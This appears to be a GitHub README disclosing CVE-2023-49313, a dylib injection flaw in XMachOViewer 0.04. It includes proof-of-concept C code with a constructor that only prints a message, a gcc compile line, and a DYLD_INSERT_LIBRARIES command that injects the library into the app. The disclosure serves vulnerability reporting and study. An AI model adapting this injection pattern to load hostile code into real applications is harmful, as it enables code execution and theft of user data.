# CVE-2023-49313
A dylib injection vulnerability in XMachOViewer 0.04 allows attackers to compromise integrity. By exploiting this, unauthorized code can be injected into the product's processes, potentially leading to remote control and unauthorized access to sensitive user data.

![Captura de Tela 2023-11-27 às 20 06 48](https://github.com/louiselalanne/CVE-2023-49313/assets/100588945/1486960a-95ce-45e6-9a5b-b81f9c91e2e8)

Portable version for macOS

- First we'll write the dylib
```
#include <syslog.h>
#include <stdio.h>

__attribute__((constructor))
static void poc(void)
{
    printf("Malicious Dylib Inserted");
}
```

- Compile
`gcc -dynamiclib -arch x86_64 -o poc.dylib poc.c`

- And Inject it:
`DYLD_INSERT_LIBRARIES=poc.dylib /Applications/XMachOViewer.app/Contents/MacOS/XMachOViewer`

This will open the application and run dylib. After closing the application, we see it in the terminal: 

![Captura de Tela 2023-11-27 às 19 52 57](https://github.com/louiselalanne/CVE-2023-49313/assets/100588945/657fbc03-f511-4267-9d5e-58c68bb4cf63)

- You can study and understand more about the topic in: https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries
